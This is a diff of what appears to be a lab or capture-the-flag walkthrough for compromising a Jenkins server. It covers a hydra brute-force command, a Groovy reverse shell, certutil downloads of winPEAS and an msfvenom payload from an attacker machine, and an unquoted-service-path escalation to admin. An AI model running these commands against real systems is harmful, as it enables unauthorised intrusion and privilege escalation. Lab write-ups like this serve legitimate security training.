@@ -239,13 +239,55 @@ flag
 nmap scan (http ports on 8080 and 5357
 ![image](https://github.com/user-attachments/assets/7df2037d-e4f7-4081-b51b-3716be42de77)
 
-go to http://192.168.79.21:8080 (note that https wont work)
+go to http://192.168.79.21:8080 (note that https wont work)  
+
 ![image](https://github.com/user-attachments/assets/b28c87c2-f299-4f6b-9bc8-96c2344a92e8)
 
 using burpsuite to get the login infos
 ![image](https://github.com/user-attachments/assets/c41e4a91-aefb-49f4-b48e-d37c90a3fd5b)
 
 using hydra to crack the passwords. (userlist contains simple users such as admin, jenkins, user.)
--L userfile -P passwordfile -u(test all users) -f(until 1 is found) 192.168.79.21 -s (PORT) http-post-form "/login:user=^USER^&pass=^PASS^:F(failure condition)='Invalid'"
+-L userfile -P passwordfile -u(test all users) -f(until 1 is found) 192.168.79.21 -s (PORT) http-post-form "/login:user=^USER^&pass=^PASS^:F(failure condition)='Invalid'" (DID NOT WORK)
 ![image](https://github.com/user-attachments/assets/c41e4a91-aefb-49f4-b48e-d37c90a3fd5b)
+
+using msfconsole jenkins aux payload.
+![image](https://github.com/user-attachments/assets/8724b7d3-36ba-424c-b8f2-4d599e0af239)  
+![image](https://github.com/user-attachments/assets/cf753402-7d67-48c0-822c-e9b960f58a18)
+
+running aux
+![image](https://github.com/user-attachments/assets/64f3710e-5537-479a-8f41-71f222258979)
+
+after login, under manage jenkins => script console we can see that it can execute groovy script.
+![image](https://github.com/user-attachments/assets/f1fc9800-a467-4c06-a9dc-1f5cbc251b85)
+i run a groovy jenkins reverse shell i found on google and opened a listener 
+![image](https://github.com/user-attachments/assets/ba64a6ee-5fb3-480d-870e-c09f2cedf8d5)
+
+Download winpeas exe, put into transfer folder, run python3 http server  
+![image](https://github.com/user-attachments/assets/90eedf01-87f2-4ba6-822a-c21a951866e1)  
+
+use certutil to retrieve file (certutil.exe -urlcache -f http://attackermachineip/winPEASx64.exe winpeas.exe)
+![image](https://github.com/user-attachments/assets/0ea2b50b-f028-4563-ae82-1cef8fa4471b)  
+
+run by typing "winpeas.exe". no quotes and space detected means that the file is vulnerable to unquoted service path
+![image](https://github.com/user-attachments/assets/e88d95e1-59a9-4700-af4b-e97ddf7f257a)
+
+msfvenom create a reverse tcp shell on port 7777 and start web server
+![image](https://github.com/user-attachments/assets/2552f695-765f-40cf-af29-12bb6f303202)  
+
+go to c:/program files x64/Wise certutil -urlcache -f http://attackerip/Wise.exe Wise.exe
+![image](https://github.com/user-attachments/assets/75a6ab5b-3732-4385-84c3-5e299f4b2e88)
+
+
+nc -nlvp 7777
+sc stop WiseBootAssistant
+sc start WiseBootAssistant
+![image](https://github.com/user-attachments/assets/012dbf46-012e-4067-94f8-c0769d9c44b4)
+u have entered in admin
+![image](https://github.com/user-attachments/assets/2c3f218b-4bda-4277-891e-1d201eb3d2a2)
+
+
+
+
+
+
 
